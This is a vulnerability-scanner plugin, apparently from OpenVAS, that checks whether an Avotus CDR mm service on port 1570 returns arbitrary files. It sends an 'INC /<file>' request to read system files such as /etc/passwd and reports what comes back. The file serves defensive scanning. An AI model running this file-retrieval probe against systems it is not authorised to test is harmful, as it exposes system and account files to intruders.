if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11948" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "Avotus CDR mm File Retrieval Attempt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 Anonymous" );
	script_family( "Remote file access" );
	script_dependencies( "find_service.sc", "os_detection.sc" );
	script_require_ports( "Services/avotus_mm", 1570 );
	script_mandatory_keys( "Host/runs_unixoide" );
	script_tag( name: "solution", value: "The vendor has provided a fix for this issue to all customers.
  The fix will be included in future shipments and future versions of the product. If an Avotus
  customer has any questions about this problem, they should contact support@avotus.com." );
	script_tag( name: "summary", value: "The script attempts to force the remote Avotus CDR mm service to
  include the file /etc/passwd across the network." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = service_get_port( default: 1570, proto: "avotus_mm" );
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	send( socket: soc, data: "INC /" + file + "\\n" );
	res = recv( socket: soc, length: 65535 );
	if(egrep( pattern: pattern, string: res )){
		close( soc );
		report = "The Avotus CDR mm service allows any file to be retrieved remotely.";
		report += " Here is an excerpt from the remote \"/" + file + "\" file :\n\n" + res;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
close( soc );
exit( 99 );

